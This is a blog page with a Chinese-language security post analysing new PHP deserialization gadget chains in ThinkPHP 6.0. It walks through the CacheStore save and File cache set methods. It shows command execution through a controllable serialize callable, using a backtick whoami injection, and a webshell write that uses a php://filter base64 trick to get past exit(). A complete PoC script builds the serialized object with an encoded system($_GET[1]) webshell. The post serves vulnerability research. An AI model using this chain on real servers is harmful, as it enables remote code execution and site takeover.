@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":"enable","show_result":false,"style":"mac"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文首发安全客 https://www.anquanke.com/post/id/194036 网上关于thinkphp pop 链的分析大概都是将下面几篇文章自己复现了一遍 https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%">
+<meta name="keywords" content="deserialization,gadget,php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="thinkphp-6.0-new-pop-gadget">
+<meta property="og:url" content="https://blog.sometimenaive.com/2019/12/09/thinkphp-6.0-new-pop-gadget/index.html">
+<meta property="og:site_name" content="yxxx&#39;s blog">
+<meta property="og:description" content="本文首发安全客 https://www.anquanke.com/post/id/194036 网上关于thinkphp pop 链的分析大概都是将下面几篇文章自己复现了一遍 https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130195427349.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130195805701.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130200042909.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130201551595.png">
+<meta property="og:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130202826622.png">
+<meta property="og:updated_time" content="2023-12-31T12:47:14.833Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="thinkphp-6.0-new-pop-gadget">
+<meta name="twitter:description" content="本文首发安全客 https://www.anquanke.com/post/id/194036 网上关于thinkphp pop 链的分析大概都是将下面几篇文章自己复现了一遍 https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%">
+<meta name="twitter:image" content="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130195427349.png">
+  <link rel="canonical" href="https://blog.sometimenaive.com/2019/12/09/thinkphp-6.0-new-pop-gadget/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>thinkphp-6.0-new-pop-gadget | yxxx's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yxxx's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-recommend">
+      
+    
+
+    <a href="/recommend" rel="section"><i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>recommend</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://blog.sometimenaive.com/2019/12/09/thinkphp-6.0-new-pop-gadget/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="yxxx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yxxx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">thinkphp-6.0-new-pop-gadget
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-12-09 15:12:17" itemprop="dateCreated datePublished" datetime="2019-12-09T15:12:17+00:00">2019-12-09</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-12-31 12:47:14" itemprop="dateModified" datetime="2023-12-31T12:47:14+00:00">2023-12-31</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/sec/" itemprop="url" rel="index"><span itemprop="name">sec</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文首发安全客 <a href="https://www.anquanke.com/post/id/194036" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194036</a></p>
+<p>网上关于thinkphp pop 链的分析大概都是将下面几篇文章自己复现了一遍</p>
+<p><a href="https://blog.riskivy.com/挖掘暗藏thinkphp中的反序列利用链/" target="_blank" rel="noopener">https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/</a></p>
+<p><a href="https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage" target="_blank" rel="noopener">https://github.com/Nu1LCTF/n1ctf-2019/tree/master/WEB/sql_manage</a></p>
+<p><a href="https://www.anquanke.com/post/id/187332" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187332</a></p>
+<p><a href="https://www.anquanke.com/post/id/187393" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187393</a></p>
+<p>下面补充thinkphp 6.0 下面的几条新链</p>
+<p>搜索<code>__destruct</code> </p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130195427349.png" alt="image-20191130195427349"></p>
+<p>在<code>__destruct</code>中调用了<code>$this-&gt;save()</code> 接下来我们去找子类中哪些实现了<code>save</code>  方法</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130195805701.png" alt="image-20191130195805701"></p>
+<p>通过find Usages 查看哪些类extends 了AbstractCache</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130200042909.png" alt="image-20191130200042909"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getForStorage</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cleaned = <span class="keyword">$this</span>-&gt;cleanContents(<span class="keyword">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> json_encode([$cleaned, <span class="keyword">$this</span>-&gt;complete]);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanContents</span><span class="params">(array $contents)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $cachedProperties = array_flip([</span><br><span class="line">            <span class="string">'path'</span>, <span class="string">'dirname'</span>, <span class="string">'basename'</span>, <span class="string">'extension'</span>, <span class="string">'filename'</span>,</span><br><span class="line">            <span class="string">'size'</span>, <span class="string">'mimetype'</span>, <span class="string">'visibility'</span>, <span class="string">'timestamp'</span>, <span class="string">'type'</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($contents <span class="keyword">as</span> $path =&gt; $object) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($object)) &#123;</span><br><span class="line">                $contents[$path] = array_intersect_key($object, $cachedProperties);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $contents;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>array_flip 是将键值进行翻转</p>
+<p>array_intersect_key 计算交集</p>
+<p><code>$this-&gt;getForStorage()</code> 可控, 将要cache的内容转化成<code>json</code>格式</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       $contents = <span class="keyword">$this</span>-&gt;getForStorage();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">$this</span>-&gt;store-&gt;set(<span class="keyword">$this</span>-&gt;key, $contents, <span class="keyword">$this</span>-&gt;expire);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p><code>$this-&gt;store</code> 可控，set可能能触发<code>__call</code>， 但是如果某个class 本身set 就会做一些危险操作也是利用的，这里我找到了</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130201551595.png" alt="image-20191130201551595"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($name, $value, $expire = null)</span>: <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;writeTimes++;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_null($expire)) &#123;</span><br><span class="line">            $expire = <span class="keyword">$this</span>-&gt;options[<span class="string">'expire'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $expire   = <span class="keyword">$this</span>-&gt;getExpireTime($expire);</span><br><span class="line">        $filename = <span class="keyword">$this</span>-&gt;getCacheKey($name);</span><br><span class="line"></span><br><span class="line">        $dir = dirname($filename);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!is_dir($dir)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                mkdir($dir, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">                <span class="comment">// 创建失败</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;serialize($value);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'data_compress'</span>] &amp;&amp; function_exists(<span class="string">'gzcompress'</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            $data = gzcompress($data, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $data   = <span class="string">"&lt;?php\n//"</span> . sprintf(<span class="string">'%012d'</span>, $expire) . <span class="string">"\n exit();?&gt;\n"</span> . $data;</span><br><span class="line">        $result = file_put_contents($filename, $data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">            clearstatcache();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里有两种利用方式</p>
+<ol>
+<li>$this-&gt;serialize</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span><span class="params">($data)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_numeric($data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> (string) $data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $serialize = <span class="keyword">$this</span>-&gt;options[<span class="string">'serialize'</span>][<span class="number">0</span>] ?? <span class="string">"\Opis\Closure\serialize"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $serialize($data);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这里<code>$serizlize</code> 是可控的，<code>$data</code> 会被转换成json，有没有办法利用呢？</p>
+<p>答案是有的，利用system</p>
+<p><img src="https://blog.sometimenaive.com/blog-img/2020/5/image-20191130202826622.png" alt="image-20191130202826622"></p>
+<p>最后相当于执行的是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&apos;&#123;&quot;1&quot;:&quot;`whoami`&quot;&#125;&apos;);</span><br></pre></td></tr></table></figure>
+<p>在shell里面，`的优先级是高于”的，所以会先执行whoami 然后再将执行结果拼接成一个新的命令</p>
+<ol>
+<li>写文件写个shell</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCacheKey</span><span class="params">(string $name)</span>: <span class="title">string</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $name = hash(<span class="keyword">$this</span>-&gt;options[<span class="string">'hash_type'</span>], $name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'cache_subdir'</span>]) &#123;</span><br><span class="line">            <span class="comment">// 使用子目录</span></span><br><span class="line">            $name = substr($name, <span class="number">0</span>, <span class="number">2</span>) . DIRECTORY_SEPARATOR . substr($name, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>]) &#123;</span><br><span class="line">            $name = <span class="keyword">$this</span>-&gt;options[<span class="string">'prefix'</span>] . DIRECTORY_SEPARATOR . $name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;options[<span class="string">'path'</span>] . $name . <span class="string">'.php'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>会根据hash的类型进行hash，然后和path进行拼接，所以文件名的前缀我们是可控的。</p>
+<p><code>$data = $this-&gt;serialize($value);</code> 还会再处理一次，可以用一些字符串函数比如serialize, strip_tags 等</p>
+<p>但是会发现在写的php前面有个<code>exit();</code> ，可以通过伪协议绕过。</p>
+<p>这里面会有几个小坑，第一个要在payload前面填充几个字符，将前面凑成4的倍数，payload编码的base64不要以=结尾，因为后面还有拼接的东西。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">filesystem</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CacheStore</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">store</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $key;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $cache;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> $complete;</span><br><span class="line">        <span class="keyword">protected</span> $autosave;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($store)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;store = $store;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;autosave = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;key = <span class="string">"haha"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cache = [<span class="string">"ppp"</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;complete = <span class="string">"xxxxxPD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/PmYK"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">class</span> <span class="title">File</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">writeTimes</span> = 0;</span><br><span class="line">        <span class="keyword">protected</span> $options;</span><br><span class="line">        <span class="keyword">protected</span> $expire;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options = [</span><br><span class="line">                <span class="string">'expire'</span> =&gt; <span class="number">2333</span>,</span><br><span class="line">                <span class="string">'hash_type'</span> =&gt; <span class="string">"md5"</span>,</span><br><span class="line">                <span class="string">'cache_subdir'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                <span class="string">'prefix'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                <span class="string">'path'</span> =&gt; <span class="string">'php://filter/convert.base64-decode/resource=/var/www/html/public/tmp/592dc1993715d4b8b3be46b75a8a0860/'</span>,</span><br><span class="line">                <span class="string">'serialize'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                <span class="string">'data_compress'</span> =&gt; <span class="keyword">false</span>,</span><br><span class="line">                <span class="string">'serialize'</span> =&gt; [<span class="string">'serialize'</span>]</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">store</span> = <span class="title">new</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>();</span><br><span class="line">    $cache = <span class="keyword">new</span> think\filesystem\CacheStore($store);</span><br><span class="line">    $s = serialize($cache);</span><br><span class="line">    <span class="keyword">echo</span> $s;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode($s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>system 可以参考上面的自己写一个。</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/deserialization/" rel="tag"># deserialization</a>
+            
+              <a href="/tags/gadget/" rel="tag"># gadget</a>
+            
+              <a href="/tags/php/" rel="tag"># php</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/01/26/l33t-writeup/" rel="next" title="l33t writeup">
+                  <i class="fa fa-chevron-left"></i> l33t writeup
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/04/08/twig3.x-with-symfony-ssti-payloads/" rel="prev" title="twig 3.x with symfony ssti payloads">
+                  twig 3.x with symfony ssti payloads <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">yxxx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">13</span>
+        <span class="site-state-item-name">tags</span>
+        </a>
+      </div>
+    
+  </nav>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">yxxx</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
